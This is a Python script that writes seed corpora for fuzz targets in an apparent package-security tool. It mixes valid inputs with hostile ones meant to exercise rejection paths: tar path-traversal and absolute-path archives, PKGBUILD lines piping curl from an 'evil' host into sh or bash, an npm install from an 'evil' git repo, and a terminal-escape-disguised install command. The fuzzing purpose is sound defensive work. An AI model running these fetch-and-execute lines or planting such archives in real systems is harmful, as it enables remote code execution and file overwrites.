#!/usr/bin/env python3
"""Generate the committed seed corpus for the cargo-fuzz targets.

Every fuzz run used to start from an empty corpus, so the first minute of
each run re-derived the same trivial inputs. This writes a handful of
meaningful seeds per target into `fuzz/corpus/<target>/`: valid inputs the
parsers accept, and hostile inputs at the shape each fail-closed boundary
rejects. The nightly soak grows these via the CI cache; the committed seeds
are the floor every run starts from.

Usage: scripts/gen_fuzz_seeds.py [--force]
"""

import argparse
import gzip
import io
import json
import pathlib
import tarfile

REPO_ROOT = pathlib.Path(__file__).resolve().parent.parent
CORPUS = REPO_ROOT / "fuzz" / "corpus"


def tar_bytes(entries: dict, *, mode: str = "w:") -> bytes:
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode=mode) as tar:
        for name, content in sorted(entries.items()):
            data = content.encode("utf-8") if isinstance(content, str) else content
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            info.mtime = 0
            tar.addfile(info, io.BytesIO(data))
    return raw.getvalue()


def gz(data: bytes) -> bytes:
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", mtime=0) as gzobj:
        gzobj.write(data)
    return buf.getvalue()


def write(target: str, name: str, payload) -> None:
    data = payload if isinstance(payload, bytes) else payload.encode("utf-8")
    out = CORPUS / target / name
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_bytes(data)


def gen_safe_extract() -> None:
    benign = {"package/package.json": '{"name":"seed","version":"1.0.0"}\n',
              "package/lib/index.js": "module.exports = 1;\n"}
    write("safe_extract", "benign.tgz", gz(tar_bytes(benign)))
    # Hostile shapes the extractor must refuse: the point of each seed is to
    # keep the rejection paths covered from the first fuzzer generation.
    write("safe_extract", "traversal.tgz", gz(tar_bytes({
        "package/package.json": '{"name":"seed","version":"1.0.0"}\n',
        "package/../escape.txt": "x"})))
    write("safe_extract", "absolute.tgz", gz(tar_bytes({"/etc/escape.txt": "x"})))
    write("safe_extract", "device_name.tgz", gz(tar_bytes({"package/CONIN$": "x"})))
    write("safe_extract", "deep.tgz", gz(tar_bytes({
        "package/" + "/".join(f"d{i}" for i in range(60)) + "/f.txt": "x"})))
    write("safe_extract", "long_name.tgz", gz(tar_bytes({"package/" + "n" * 300: "x"})))
    write("safe_extract", "not_gzip.bin", b"\x00\x01\x02\x03 not a gzip stream")
    write("safe_extract", "truncated.tgz", gz(tar_bytes(benign))[:64])


def gen_read_package_json() -> None:
    write("read_package_json", "valid.json", '{"name":"seed","version":"1.0.0","scripts":{"preinstall":"curl http://x"}}\n')
    write("read_package_json", "deep_nest.json", json.dumps({"a": {"b": {"c": {"d": [1, 2, [3, [4]]]}}}}))
    write("read_package_json", "unicode.json", '{"na\u00e9me":"s\u00e9ed","scripts":{"install":"ünïcode"}}')
    write("read_package_json", "numbers.json", '{"big": 123456789012345678901234567890, "neg": -1e309}')
    write("read_package_json", "truncated.json", '{"name": "seed", "vers')


def gen_pypi_version() -> None:
    for i, s in enumerate([
        "1.0", "1.2.3", "1!2.0", "1.0a1", "1.0b2", "1.0rc3", "1.0.post1",
        "1.0.dev1", "2!1.0rc1.post2.dev3", "2024.10.1", "1.0+local.1",
    ]):
        write("pypi_version", f"v{i:02d}", s)


def gen_aur_version() -> None:
    for i, s in enumerate([
        "1.2.3", "1.2.3-1", "2:1.0.0-1", "0.9.1-5", "20240101-1",
        "6.9.0.r123.gabcdef0-1", "1:9.9.9-99",
    ]):
        write("aur_version", f"v{i:02d}", s)


def gen_pkgbuild_tokenizer() -> None:
    write("pkgbuild_tokenizer", "benign", """
pkgname=benign
pkgver=1.2.3
pkgrel=1
arch=('x86_64')
source=("https://example.com/$pkgname-$pkgver.tar.gz")
build() { make; }
package() { make DESTDIR="$pkgdir" install; }
""")
    write("pkgbuild_tokenizer", "hostile", """
pkgname=$(curl http://evil | sh)
url="http://[ff02::2]/x"
package() { curl -fsSL http://evil.sh | bash; }
""")
    write("pkgbuild_tokenizer", "unbalanced", "pkgname=${unclosed")


def gen_install_ref_scan() -> None:
    for i, s in enumerate([
        "npm install express@4.21.2\n",
        "pip install requests==2.31.0\n",
        "cargo add serde@1.0.200\n",
        "yarn add @scope/pkg@^2.0.0 --ignore-engines\n",
        "npm install git+ssh://git@github.com/evil/repo.git#main\n",
        "pip install -r requirements.txt --index-url http://[::1]:8080/simple\n",
        "\x1b]8;;http://evil\x07npm install evil\x1b]8;;\x07\n",
    ]):
        write("install_ref_scan", f"line{i:02d}", s)


GENERATORS = {
    "safe_extract": gen_safe_extract,
    "read_package_json": gen_read_package_json,
    "pypi_version": gen_pypi_version,
    "aur_version": gen_aur_version,
    "pkgbuild_tokenizer": gen_pkgbuild_tokenizer,
    "install_ref_scan": gen_install_ref_scan,
}


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--force", action="store_true",
                        help="overwrite seed files even if they exist")
    args = parser.parse_args()

    for target, gen in GENERATORS.items():
        existing = sorted(p.name for p in (CORPUS / target).glob("*")) if (CORPUS / target).exists() else []
        if existing and not args.force:
            print(f"{target}: {len(existing)} seeds already present, skipping (--force to regenerate)")
            continue
        gen()
        count = len(list((CORPUS / target).glob("*")))
        print(f"{target}: wrote {count} seeds")


if __name__ == "__main__":
    main()
